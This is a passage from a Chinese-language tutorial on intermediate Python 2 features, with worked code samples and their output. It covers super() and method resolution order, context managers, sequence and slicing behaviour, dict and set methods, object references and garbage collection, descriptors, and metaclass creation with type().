title="2.真的是调用父类吗？"></a><strong>2.真的是调用父类吗？</strong></h4><p>我们来做一个实验</p><p><strong>示例代码：</strong></p><pre><code class="hljs">class A(object):    def __init__(self):        print &quot;a&quot;class B(A):    def __init__(self):        print &quot;b&quot;        super(B,self).__init__()class C(A):    def __init__(self):        print &quot;c&quot;        super(C,self).__init__()class D(B,C):    def __init__(self):        print &quot;d&quot;        super(D,self).__init__()if __name__ ==  &#39;__main__&#39;:    b = D()</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">dbca</code></pre><p><strong>解释:</strong></p><p>我们看到当我们调用到 B 的时候，super 并没有去找B 的父类A 而是转向了C ，这说明我们单纯的将 super 理解为寻找父类是不正确的，其实这个顺序是我们之前讲的 mro</p><h3 id="9-Python-中的-with-语句"><a href="#9-Python-中的-with-语句" class="headerlink" title="9.Python 中的 with 语句"></a><strong>9.Python 中的 with 语句</strong></h3><p>with 语句是用来使用上下文管理器的，那么什么叫做上下文管理器呢？</p><h4 id="1-上下文管理器"><a href="#1-上下文管理器" class="headerlink" title="1.上下文管理器"></a><strong>1.上下文管理器</strong></h4><p>介绍这个概念就涉及到我们之前说的魔法函数，只要拥有<code>__enter__</code> 和  <code>__exit__</code> 这两个属性的类实例化的对象就可以作为上下文管理器</p><p>我们可以举例看一下</p><p><strong>示例代码：</strong></p><pre><code class="hljs">class Sample(object):    def __enter__(self):        print &quot;enter&quot;        return self # 注意这句话绝对不能少，要不然sample 根本得不到这个对象的实例    def __exit__(self, exc_type, exc_val, exc_tb):        print &quot;exit&quot;    def do_something(self):        print &quot;do_something&quot;with Sample() as sample:    sample.do_something()</code></pre><p><strong>结果:</strong></p><pre><code class="hljs">enterdo_somethingexit</code></pre><p><strong>解释：</strong></p><p>可以看到，<code>__enter__</code> 和 <code>__exit__</code> 魔法函数会在调用和结束的时候自动运行，同时，拥有这两个魔法函数的类可以用 with 语句进行实例化，成为一个上下文管理器，我们可以在 <code>__enter__</code> 中创建资源，在 <code>__exit__</code> 中释放</p><h3 id="10-使用-contextlib-简化上下文管理器"><a href="#10-使用-contextlib-简化上下文管理器" class="headerlink" title="10.使用 contextlib 简化上下文管理器"></a><strong>10.使用 contextlib 简化上下文管理器</strong></h3><p><strong>实例代码：</strong></p><pre><code class="hljs">import contextlib@contextlib.contextmanagerdef file_open(file_name):    print &quot;file_open&quot;  # 这里写的是 __enter__ 中的代码    yield&#123;&#125;    print &quot;file_close&quot; # 这里写的是 __exit__ 中的代码with file_open(&quot;test.txt&quot;) as f:    print &quot;test&quot;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">file_opentestfile_close</code></pre><h2 id="五、自定义序列类"><a href="#五、自定义序列类" class="headerlink" title="五、自定义序列类"></a><strong>五、自定义序列类</strong></h2><h3 id="1-序列的分类："><a href="#1-序列的分类：" class="headerlink" title="1.序列的分类："></a><strong>1.序列的分类：</strong></h3><h4 id="1-容器序列-list-、tuple-、deque"><a href="#1-容器序列-list-、tuple-、deque" class="headerlink" title="(1)容器序列: list 、tuple 、deque"></a><strong>(1)容器序列: list 、tuple 、deque</strong></h4><p>容器序列中可以放置任何的数据类型</p><h4 id="2-扁平序列：str-、bytes-、bytearray-、array-array"><a href="#2-扁平序列：str-、bytes-、bytearray-、array-array" class="headerlink" title="(2)扁平序列：str 、bytes 、bytearray 、array.array"></a><strong>(2)扁平序列：str 、bytes 、bytearray 、array.array</strong></h4><p>该序列中只有一钟类型</p><h4 id="3-可变序列-list-、deque-、bytearray-、array"><a href="#3-可变序列-list-、deque-、bytearray-、array" class="headerlink" title="(3) 可变序列: list 、deque 、bytearray 、array"></a><strong>(3) 可变序列: list 、deque 、bytearray 、array</strong></h4><h4 id="4-不可变序列：-str-、tuple-、bytes"><a href="#4-不可变序列：-str-、tuple-、bytes" class="headerlink" title="(4) 不可变序列： str 、tuple 、bytes"></a><strong>(4) 不可变序列： str 、tuple 、bytes</strong></h4><h3 id="2-序列中的魔法函数"><a href="#2-序列中的魔法函数" class="headerlink" title="2.序列中的魔法函数"></a><strong>2.序列中的魔法函数</strong></h3><p><code>__len__</code> 有这个方法就能实现计算长度 </p><p><code>__iter__</code> 有这个方法就能实现迭代</p><p><code>__container__</code> 有这个方法就能实现使用in判断元素是否存在</p><p>等等</p><p>我们如果要自定义序列类型就要去实现这些函数</p><h3 id="3-序列中的-和-extend-的区别"><a href="#3-序列中的-和-extend-的区别" class="headerlink" title="3.序列中的 + +&#x3D; 和 extend 的区别"></a><strong>3.序列中的 + +&#x3D; 和 extend 的区别</strong></h3><h4 id="1-的使用"><a href="#1-的使用" class="headerlink" title="1. + 的使用"></a><strong>1. + 的使用</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">a = [1,2]c = a +[3,4]print c</code></pre><p><strong>结果：</strong></p><h4 id="2-的使用"><a href="#2-的使用" class="headerlink" title="2.+&#x3D; 的使用"></a><strong>2.+&#x3D; 的使用</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">a = [1,2]a += [3,4]print a </code></pre><p><strong>结果：</strong></p><pre><code class="hljs">[1, 2, 3, 4]</code></pre><h4 id="3-但是这两个实际上是有一些区别的"><a href="#3-但是这两个实际上是有一些区别的" class="headerlink" title="3.但是这两个实际上是有一些区别的"></a><strong>3.但是这两个实际上是有一些区别的</strong></h4><p><strong>（1）区别一： +&#x3D; 是直接在 a 上进行操作</strong><br>这个就不用多解释了</p><p><strong>(2)区别二：+&#x3D; 可以扩展不同类型的可迭代对象</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">a = [1,2]a += (3,4)print a</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">[1, 2, 3, 4]</code></pre><p>我们发现+&#x3D;的神奇特性，实际上，+&#x3D;底层调用的是 extend()方法，这个方法实际上在调用for 循环，因此支持for 循环的都能添加去</p><p><strong>还有一点就是人们经常把 append() 和 extend() 混淆</strong></p><p>append(） 会将参数直接放进列表中</p><p><strong>示例代码：</strong></p><pre><code class="hljs">a = [1,2]a.append([3,4])print a</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">[1, 2, [3, 4]]</code></pre><h3 id="4-实现可切片对象"><a href="#4-实现可切片对象" class="headerlink" title="4.实现可切片对象"></a><strong>4.实现可切片对象</strong></h3><h4 id="1-先来回顾一下切片操作"><a href="#1-先来回顾一下切片操作" class="headerlink" title="1.先来回顾一下切片操作"></a><strong>1.先来回顾一下切片操作</strong></h4><p>模式： [start:end:step]</p><p>start 意思是起始位置，默认是0<br>end 意思是结束的位置，默认是列表的长度<br>step 默认是1</p><blockquote><p><strong>注意：</strong><br>1.当step 是负数的时候代表反向切片，这个时候 start 要比 end 来的大<br>2.切片返回的是一个新的元素而不会改变原来列表的值<br>3.步长为2表示包括自己在内数两个，也就是隔一个取一个</p></blockquote><p><strong>实例:</strong></p><p>在末尾插入一个元素</p><pre><code class="hljs">a[len(a):] = [1] </code></pre><p>在开头插入一个元素</p><pre><code class="hljs">a[:0] = [1]</code></pre><p>在特定位置插入一个元素</p><pre><code class="hljs">a[3:3] = [1]</code></pre><p>隔一个修改一个</p><pre><code class="hljs">a[::2] = [0]*3</code></pre><p>隔一个删除一个</p><pre><code class="hljs">del a[::2]</code></pre><h4 id="2-自己构造一个可切片对象"><a href="#2-自己构造一个可切片对象" class="headerlink" title="2.自己构造一个可切片对象"></a><strong>2.自己构造一个可切片对象</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">import numbersclass Group():    def __init__(self,group_name,company_name,staffs):        self.group_name = group_name        self.company_name = company_name        self.staffs = staffs    def __getitem__(self, item):        cls = type(self)        if isinstance(item,slice):            return cls(group_name=self.group_name,company_name=self.company_name,staffs=self.staffs[item])        elif isinstance(item,numbers.Integral):            return cls(group_name=self.group_name,company_name=self.company_name,staffs=[self.staffs[item]])staffs = [&quot;Alice&quot;,&quot;Bob&quot;,&quot;Tom&quot;,&quot;Kali&quot;]group = Group(company_name=&quot;K0rz3n&quot;,group_name=&quot;user&quot;,staffs=staffs)sub_group = group[1:2]sub_group = group[0]</code></pre><p>这个代码我本地也没有实现，会报错，还有待解决</p><h3 id="5-bisect-维持已排序的序列"><a href="#5-bisect-维持已排序的序列" class="headerlink" title="5.bisect 维持已排序的序列"></a><strong>5.bisect 维持已排序的序列</strong></h3><p>bisect 能维持一个已经排序好的序列（以升序排序）</p><p><strong>示例代码：</strong></p><pre><code class="hljs">import bisectinter_list = []bisect.insort(inter_list,2)bisect.insort(inter_list,5)bisect.insort(inter_list,1)bisect.insort(inter_list,6)bisect.insort(inter_list,3)bisect.insort(inter_list,4)print inter_list</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">[1, 2, 3, 4, 5, 6]</code></pre><p>我们还能查看某个元素应该插入什么位置</p><p><strong>示例代码：</strong></p><pre><code class="hljs">print bisect.bisect(inter_list,3)</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">3</code></pre><h3 id="6-什么时候我们不应该使用列表"><a href="#6-什么时候我们不应该使用列表" class="headerlink" title="6.什么时候我们不应该使用列表"></a><strong>6.什么时候我们不应该使用列表</strong></h3><p>array 相当于 C语言的数组，在数据处理中的效率是非常高的，但是我们要注意 array 中存放的只能是一种数据类型，我们在声明的时候就要指定</p><p><strong>示例代码：</strong></p><pre><code class="hljs">import arraymy_array = array.array(&quot;i&quot;)my_array.append(1)my_array.append(2)print my_array</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">array(&#39;i&#39;, [1, 2])</code></pre><h2 id="六、Python-中的-set-和-dict"><a href="#六、Python-中的-set-和-dict" class="headerlink" title="六、Python 中的 set 和 dict"></a><strong>六、Python 中的 set 和 dict</strong></h2><h3 id="1-dict-中的常用方法"><a href="#1-dict-中的常用方法" class="headerlink" title="1.dict 中的常用方法"></a><strong>1.dict 中的常用方法</strong></h3><h4 id="1-clear-方法："><a href="#1-clear-方法：" class="headerlink" title="(1)clear 方法："></a><strong>(1)clear 方法：</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">a = &#123;&quot;K0rz3n&quot;:&#123;&quot;hello&quot;:&quot;world&quot;&#125;,     &quot;KKKK&quot;:&#123;&quot;hello&quot;:&quot;K0rz3n&quot;&#125;,     &quot;xxxxx&quot;:&#123;&quot;xxx&quot;:&quot;sssss&quot;&#125;&#125;a.clear()print a </code></pre><p><strong>结果：</strong></p><pre><code class="hljs">&#123;&#125;</code></pre><h4 id="2-copy-方法"><a href="#2-copy-方法" class="headerlink" title="(2)copy() 方法"></a><strong>(2)copy() 方法</strong></h4><blockquote><p><strong>注意：</strong></p><p>这个拷贝是浅拷贝，也就是说不能循环嵌套拷贝</p></blockquote><p><strong>示例代码：</strong></p><pre><code class="hljs">a = &#123;&quot;K0rz3n&quot;:&#123;&quot;hello&quot;:&quot;world&quot;&#125;,     &quot;KKKK&quot;:&#123;&quot;hello&quot;:&quot;K0rz3n&quot;&#125;,     &quot;xxxxx&quot;:&#123;&quot;xxx&quot;:&quot;sssss&quot;&#125;&#125;new_dict = a.copy()new_dict[&quot;K0rz3n&quot;][&quot;hello&quot;] = &quot;K0rz3n&quot;print a</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">&#123;&#39;K0rz3n&#39;: &#123;&#39;hello&#39;: &#39;K0rz3n&#39;&#125;, &#39;KKKK&#39;: &#123;&#39;hello&#39;: &#39;K0rz3n&#39;&#125;, &#39;xxxxx&#39;: &#123;&#39;xxx&#39;: &#39;sssss&#39;&#125;&#125;</code></pre><p>我们发现我们修改了拷贝值以后原始值也发生了变化，这其实就是浅拷贝导致的问题，浅拷贝遇到循环嵌套的数据时只能拷贝一层，另外的层都是一个指向，也就是指向原始的位置，因此修改了拷贝以后原始值也发生了变化</p><p><strong>解决：</strong></p><p>使用python 的一个 copy 的库</p><p><strong>示例代码</strong>：</p><pre><code class="hljs">import copya = &#123;&quot;K0rz3n&quot;:&#123;&quot;hello&quot;:&quot;world&quot;&#125;,     &quot;KKKK&quot;:&#123;&quot;hello&quot;:&quot;K0rz3n&quot;&#125;,     &quot;xxxxx&quot;:&#123;&quot;xxx&quot;:&quot;sssss&quot;&#125;&#125;new_dict = copy.deepcopy(a)new_dict[&quot;K0rz3n&quot;][&quot;hello&quot;] = &quot;K0rz3n&quot;print a</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">&#123;&#39;K0rz3n&#39;: &#123;&#39;hello&#39;: &#39;world&#39;&#125;, &#39;KKKK&#39;: &#123;&#39;hello&#39;: &#39;K0rz3n&#39;&#125;, &#39;xxxxx&#39;: &#123;&#39;xxx&#39;: &#39;sssss&#39;&#125;&#125;</code></pre><h4 id="3-fromkeys-方法"><a href="#3-fromkeys-方法" class="headerlink" title="(3)fromkeys 方法"></a><strong>(3)fromkeys 方法</strong></h4><p>将可迭代的对象转化成为一个dict</p><p><strong>示例代码：</strong></p><pre><code class="hljs">new_list = [&quot;K0rz3n&quot;,&quot;hello&quot;,&quot;world&quot;]new_dict = dict.fromkeys(new_list,&#123;&quot;hhh&quot;&#125;)print new_dict</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">&#123;&#39;K0rz3n&#39;: set([&#39;hhh&#39;]), &#39;world&#39;: set([&#39;hhh&#39;]), &#39;hello&#39;: set([&#39;hhh&#39;])&#125;</code></pre><h4 id="4-get-方法"><a href="#4-get-方法" class="headerlink" title="(4)get 方法"></a><strong>(4)get 方法</strong></h4><p>为了防止出现 keyerror 的错误</p><p><strong>示例代码：</strong></p><pre><code class="hljs">new_list = [&quot;K0rz3n&quot;,&quot;hello&quot;,&quot;world&quot;]new_dict = dict.fromkeys(new_list,&#123;&quot;hhh&quot;&#125;)value = new_dict.get(&quot;hh&quot;,&#123;&#125;)print value</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">&#123;&#125;</code></pre><h4 id="5-items-方法"><a href="#5-items-方法" class="headerlink" title="(5)items 方法"></a><strong>(5)items 方法</strong></h4><p>Items 方法可以实现元祖的拆包</p><p><strong>示例代码：</strong></p><pre><code class="hljs">new_list = [&quot;K0rz3n&quot;,&quot;hello&quot;,&quot;world&quot;]new_dict = dict.fromkeys(new_list,&#123;&quot;hhh&quot;&#125;)for key,value in new_dict.items():    print key,value</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">K0rz3n set([&#39;hhh&#39;])world set([&#39;hhh&#39;])hello set([&#39;hhh&#39;])</code></pre><h4 id="6-setdefault-方法"><a href="#6-setdefault-方法" class="headerlink" title="(6)setdefault 方法"></a><strong>(6)setdefault 方法</strong></h4><p>除了试下 get 一样的操作以外，还会将这个值设置进映射</p><p><strong>示例代码：</strong></p><pre><code class="hljs">new_list = [&quot;K0rz3n&quot;,&quot;hello&quot;,&quot;world&quot;]new_dict = dict.fromkeys(new_list,&#123;&quot;hhh&quot;&#125;)new_dict.setdefault(&quot;hh&quot;,&quot;xxx&quot;)print new_dict</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">&#123;&#39;K0rz3n&#39;: set([&#39;hhh&#39;]), &#39;world&#39;: set([&#39;hhh&#39;]), &#39;hh&#39;: &#39;xxx&#39;, &#39;hello&#39;: set([&#39;hhh&#39;])&#125;</code></pre><h4 id="7-update-方法"><a href="#7-update-方法" class="headerlink" title="(7)update 方法"></a><strong>(7)update 方法</strong></h4><p>更新dict </p><p><strong>示例代码：</strong></p><pre><code class="hljs">new_list = [&quot;K0rz3n&quot;,&quot;hello&quot;,&quot;world&quot;]new_dict = dict.fromkeys(new_list,&#123;&quot;hhh&quot;&#125;)new_dict.update(update=&quot;hahah&quot;)new_dict.update(&#123;&quot;upupup&quot;:&quot;xixixi&quot;&#125;)print new_dict</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">&#123;&#39;K0rz3n&#39;: set([&#39;hhh&#39;]), &#39;world&#39;: set([&#39;hhh&#39;]), &#39;upupup&#39;: &#39;xixixi&#39;, &#39;hello&#39;: set([&#39;hhh&#39;]), &#39;update&#39;: &#39;hahah&#39;&#125;</code></pre><h3 id="2-set-和-frozeset"><a href="#2-set-和-frozeset" class="headerlink" title="2.set 和 frozeset"></a><strong>2.set 和 frozeset</strong></h3><p>set 是集合，是无序的，不重复的，frozenset 是不可变集合</p><p>set 中放置的是一个可迭代对象</p><h4 id="1-无序"><a href="#1-无序" class="headerlink" title="(1)无序"></a><strong>(1)无序</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">a = set(&#39;abcdefs&#39;)print a</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">set([&#39;a&#39;, &#39;c&#39;, &#39;b&#39;, &#39;e&#39;, &#39;d&#39;, &#39;f&#39;, &#39;s&#39;])</code></pre><p>可见显示的顺序和我们传入的顺序是不一样的，也就是说是无序的</p><h4 id="（2）不重复"><a href="#（2）不重复" class="headerlink" title="（2）不重复"></a><strong>（2）不重复</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">a = set(&#39;abcdefssss&#39;)print a</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">set([&#39;a&#39;, &#39;c&#39;, &#39;b&#39;, &#39;e&#39;, &#39;d&#39;, &#39;f&#39;, &#39;s&#39;])</code></pre><h4 id="（3）frozenset-是不可变的"><a href="#（3）frozenset-是不可变的" class="headerlink" title="（3）frozenset 是不可变的"></a><strong>（3）frozenset 是不可变的</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">a = set(&#39;abcdefssss&#39;)a.add(&quot;x&quot;)print ab = frozenset(&#39;abcdefssss&#39;)b.add(&quot;x&quot;)print b</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">set([&#39;a&#39;, &#39;c&#39;, &#39;b&#39;, &#39;e&#39;, &#39;d&#39;, &#39;f&#39;, &#39;s&#39;, &#39;x&#39;])AttributeError: &#39;frozenset&#39; object has no attribute &#39;add&#39;</code></pre><p><strong>（4）set 能使用update 更新</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">a = set(&#39;abcdefssss&#39;)a.add(&quot;x&quot;)b = set(&quot;xxx&quot;)a.update(b)print a</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">set([&#39;a&#39;, &#39;c&#39;, &#39;b&#39;, &#39;e&#39;, &#39;d&#39;, &#39;f&#39;, &#39;s&#39;, &#39;x&#39;])</code></pre><p><strong>（5）set 使用difference 求差集</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">a = set(&#39;abcdefssss&#39;)a.add(&quot;x&quot;)b = set(&quot;abcde&quot;)new_set = a.difference(b)print new_set</code></pre><p><strong>结果：</strong></p><p>set([‘x’, ‘s’, ‘f’])</p><p>还有一种方式就是直接使用 - 号，其实底层都是使用魔法函数实现的，当然还有 | &amp; </p><p><strong>示例代码：</strong></p><pre><code class="hljs">a = set(&#39;abcdefssss&#39;)a.add(&quot;x&quot;)b = set(&quot;abcde&quot;)new_set = a.difference(b)another_set = a-bprint new_setprint another_set</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">set([&#39;x&#39;, &#39;s&#39;, &#39;f&#39;])set([&#39;x&#39;, &#39;s&#39;, &#39;f&#39;])</code></pre><h3 id="2-dict-背后的实现原理"><a href="#2-dict-背后的实现原理" class="headerlink" title="2.dict 背后的实现原理"></a><strong>2.dict 背后的实现原理</strong></h3><p>dict 背后都是通过hash 实现的，背后是一个数组，连续的内存空间，通过键值的hash到数组中寻找，因此速度非常的块。</p><p><strong>因此：</strong></p><ol><li>dict 的 key 和 set 的值都必须是可hash 的</li><li>dict 的内存花销大，但是查询速度快，很多自定义的对象或者是python 内部的对象都是用dict 包装的</li><li>dict 的存储顺序和存入的顺序有关</li><li>添加新的元素可能会改变已有数据的顺序（因为，在数组空间不足以后可能会新开辟一个新的数组，在元素进行转移的时候可能会改变存储顺序）</li></ol><h2 id="六、对象引用、可变性和垃圾回收"><a href="#六、对象引用、可变性和垃圾回收" class="headerlink" title="六、对象引用、可变性和垃圾回收"></a><strong>六、对象引用、可变性和垃圾回收</strong></h2><h3 id="1-Python-中的变量是什么？"><a href="#1-Python-中的变量是什么？" class="headerlink" title="1.Python 中的变量是什么？"></a><strong>1.Python 中的变量是什么？</strong></h3><p>Python 的变量和 Java 中的变量是不一样的，Java 中的变量是有大小的（因为有类型），声明一个变量就会在内存中开辟一定大小的空间，存放不同类型的数据，但是Python 不一样，Python 中的变量是一个指针，大小都是一样的</p><p><strong>示例代码：</strong></p><pre><code class="hljs">a = [1,2,3,4]b = ab.append(5)print a </code></pre><p><strong>结果：</strong></p><pre><code class="hljs">[1, 2, 3, 4, 5]</code></pre><p>我们看到，我们修改b 实际上把a 也修改了，本质上是指向了同一个内存空间</p><h3 id="2-Python-中的-和-is"><a href="#2-Python-中的-和-is" class="headerlink" title="2.Python 中的 &#x3D;&#x3D; 和 is"></a><strong>2.Python 中的 &#x3D;&#x3D; 和 is</strong></h3><h4 id="（1）is-比较的是两个的-id"><a href="#（1）is-比较的是两个的-id" class="headerlink" title="（1）is 比较的是两个的 id"></a><strong>（1）is 比较的是两个的 id</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">a = [1,2,3,4]b = aprint id(a),id(b)print a is b</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">50435592 50435592True</code></pre><p>但是有一个奇怪的情况</p><p><strong>示例代码：</strong></p><pre><code class="hljs">a = [1,2,3]b = [1,2,3]print a is ba = 1b = 1print a is b</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">FalseTrue</code></pre><p><strong>解释：</strong></p><p>其实python 在对于小整数、小字符串的情况下不会另外新建内存空间</p><h4 id="（2）-比较的是值"><a href="#（2）-比较的是值" class="headerlink" title="（2）&#x3D;&#x3D; 比较的是值"></a><strong>（2）&#x3D;&#x3D; 比较的是值</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">a = [1,2,3]b = [1,2,3]print a == ba = 1b = 1print a == b</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">TrueTrue</code></pre><h3 id="3-del-和垃圾回收"><a href="#3-del-和垃圾回收" class="headerlink" title="3.del 和垃圾回收"></a><strong>3.del 和垃圾回收</strong></h3><p>Python 中的垃圾回收机制使用的是引用计数的方式</p><p>del 并不能直接释放内存，只有在引用计数为0的时候才会释放</p><p><strong>示例代码：</strong></p><pre><code class="hljs">    a = object()    b = a        del  a    print b    print a</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">&lt;object object at 0x00000000030F90C0&gt;NameError: name &#39;a&#39; is not defined</code></pre><h2 id="七、元类编程"><a href="#七、元类编程" class="headerlink" title="七、元类编程"></a><strong>七、元类编程</strong></h2><h3 id="1-property-动态属性"><a href="#1-property-动态属性" class="headerlink" title="1.property 动态属性"></a><strong>1.property 动态属性</strong></h3><p>使用 @property 装饰器将取函数的模式改变成取属性的模式</p><p>先看一下原始的使用调用函数的方法：</p><p><strong>示例代码：</strong></p><pre><code class="hljs">from  datetime import date,datetimeclass User():    def __init__(self,name,birthday):        self.name = name        self.birthday = birthday    def get_age(self):        return datetime.now().year - self.birthday.yearif __name__ == &#39;__main__&#39;:    user = User(&quot;K0rz3n&quot;,date(year = 1999,month = 11,day = 12))    print user.get_age()</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">19</code></pre><p><strong>我们如果想用调用类的属性的方式访问呢？</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">from  datetime import date,datetimeclass User():    def __init__(self,name,birthday):        self.name = name        self.birthday = birthday    @property    def get_age(self):        return datetime.now().year - self.birthday.yearif __name__ == &#39;__main__&#39;:    user = User(&quot;K0rz3n&quot;,date(year = 1999,month = 11,day = 12))    print user.get_age</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">19</code></pre><h3 id="2-getattr-和-getattribute"><a href="#2-getattr-和-getattribute" class="headerlink" title="2.getattr 和 getattribute"></a><strong>2.<strong>getattr</strong> 和 <strong>getattribute</strong></strong></h3><h4 id="1-getattr"><a href="#1-getattr" class="headerlink" title="(1)__getattr__"></a><strong>(1)<code>__getattr__</code></strong></h4><p>这个魔法方法会在找不到属性的时候调用</p><p><strong>示例代码：</strong></p><pre><code class="hljs">from  datetime import date,datetimeclass User():    def __init__(self,name,birthday):        self.name = name        self.birthday = birthday    def __getattr__(self, item):        return &quot;can not find the attr&quot;if __name__ == &#39;__main__&#39;:    user = User(&quot;K0rz3n&quot;,date(year = 1999,month = 11,day = 12))    print user.get_age</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">can not find the attr</code></pre><h4 id="2-getattribute"><a href="#2-getattribute" class="headerlink" title="(2)__getattribute__"></a><strong>(2)<code>__getattribute__</code></strong></h4><p>这个魔法函数在属性调用的时候会第一个调用，不管属性存不存在，可以把他看成是属性调用的入口，因为地位比较重要因此不建议重写</p><p><strong>示例代码:</strong></p><pre><code class="hljs">from  datetime import date,datetimeclass User(object):    def __init__(self,name,birthday):        self.name = name        self.birthday = birthday    def __getattr__(self, item):        return &quot;can not find the attr&quot;    def __getattribute__(self, item):        return &quot;hello&quot;if __name__ == &#39;__main__&#39;:    user = User(&quot;K0rz3n&quot;,date(year = 1999,month = 11,day = 12))    print user.get_age</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">hello</code></pre><h3 id="3-属性描述符和属性的查找过程"><a href="#3-属性描述符和属性的查找过程" class="headerlink" title="3.属性描述符和属性的查找过程"></a><strong>3.属性描述符和属性的查找过程</strong></h3><h4 id="（1）属性描述符："><a href="#（1）属性描述符：" class="headerlink" title="（1）属性描述符："></a><strong>（1）属性描述符</strong>：</h4><p>开发过程中可能会遇到一个问题：们想对用户传进来的数据类型进行控制，但是由于我们需要控制的数据过多，我们不能每一个都写同样的代码，于是这就涉及到了属性描述符，实际上属性描述符也只是实现了几个魔法方法而已（<code>__get__</code> 、<code>__set__</code> 、<code>__delete__</code>）</p><p>下面我们就自己实现一个属性描述符</p><p><strong>示例代码:</strong></p><pre><code class="hljs">import numbersclass IntField(object):    def __get__(self, instance, owner):        return self.value    def __set__(self, instance, value):        if not isinstance(value,numbers.Integral):            raise ValueError(&quot;not int&quot;)        self.value = value    def __delete__(self, instance):        passclass User(object):    age = IntField()if __name__ == &#39;__main__&#39;:    user = User()    user.age = &quot;xxx&quot;    print user.age</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">ValueError: not int</code></pre><p>当然我们能多加几个条件：</p><p><strong>示例代码：</strong></p><pre><code class="hljs">import numbersclass IntField(object):    def __get__(self, instance, owner):        return self.value    def __set__(self, instance, value):        if not isinstance(value,numbers.Integral):            raise ValueError(&quot;not int&quot;)        if value &lt; 0:            raise ValueError(&quot;not &gt; 0&quot;)        self.value = value    def __delete__(self, instance):        passclass User(object):    age = IntField()if __name__ == &#39;__main__&#39;:    user = User()    user.age = -9    print user.age</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">ValueError: not &gt; 0</code></pre><h3 id="4-new-和-init-的区别"><a href="#4-new-和-init-的区别" class="headerlink" title="4.__new__ 和 __init__ 的区别"></a><strong>4.<code>__new__</code> 和 <code>__init__</code> 的区别</strong></h3><p><code>__new__</code> 可以自定义类的生成过程,而<code>__init__</code>控制的是类生成的对象，因此 new 的调用是在 init 的之前</p><p><strong>示例代码:</strong></p><pre><code class="hljs">class User(object):    def __new__(cls, *args, **kwargs):        print &quot;new&quot;    def __init__(self,name):        self.name = name        print &quot;init&quot;if __name__ == &#39;__main__&#39;:    user = User(&quot;K0rz3n&quot;)</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">new</code></pre><p>这里其实还发现一个问题，就是如果 new 方法不返回对象，Init 就永远得不到调用</p><p><strong>示例代码：</strong></p><pre><code class="hljs">class User(object):    def __new__(cls, *args, **kwargs):        print &quot;new&quot;        return super(User,cls).__new__(cls)    def __init__(self,name):        self.name = name        print &quot;init&quot;if __name__ == &#39;__main__&#39;:    user = User(&quot;K0rz3n&quot;)</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">newinit</code></pre><h3 id="5-自定义元类"><a href="#5-自定义元类" class="headerlink" title="5.自定义元类"></a><strong>5.自定义元类</strong></h3><p><strong>概念：</strong></p><p>元类是什么呢？元类就是创建类的类，比如我们之前讲的 type() 就是一个元类，再比如我们在Py3 中创建类的时候在括号中写 metaclass &#x3D;  这个就是在指明这个类的元类，MetaClass 也是一个类，他是继承于type的，我们自定义 MetaClass 来控制类对象生成的过程</p><p>通过 type() 动态的创建一个类,<strong>语法是 type(类名，继承关系，属性或者方法)</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">User = type(&quot;User&quot;,(),&#123;&#125;)user = User()print type(user)</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">&lt;class &#39;__main__.User&#39;&gt;</code></pre><p><strong>我们现在来创建一个带有属性的类</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">User = type(&quot;User&quot;,(),&#123;&quot;name&quot;:&quot;K0rz3n&quot;&#125;)user = User()print user.name</code></pre><p><strong>结果:</strong></p><pre><code class="hljs">K0rz3n</code></pre><p><strong>我们现在来创建一个带有方法的类</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">def get_age(self):    print &quot;get_age&quot;if __name__ == &#39;__main__&#39;:    User = type(&quot;User&quot;,(),&#123;&quot;name&quot;:&quot;K0rz3n&quot;,&quot;get_age&quot;:get_age&#125;)    user = User()    print user.name    print user.get_age()</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">K0rz3nget_ageNone</code></pre><p><strong>我们可以创建一个继承基类的类</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">class BaseClass(object):    def answer(self):        return &quot;i am baseclass&quot;if __name__ == &#39;__main__&#39;:    User = type(&quot;User&quot;,(BaseClass,),&#123;&quot;name&quot;:&quot;K0rz3n&quot;,&quot;get_age&quot;:get_age&#125;)    user = User()    print user.answer()</code></pre><p><strong>结果:</strong></p><pre><code 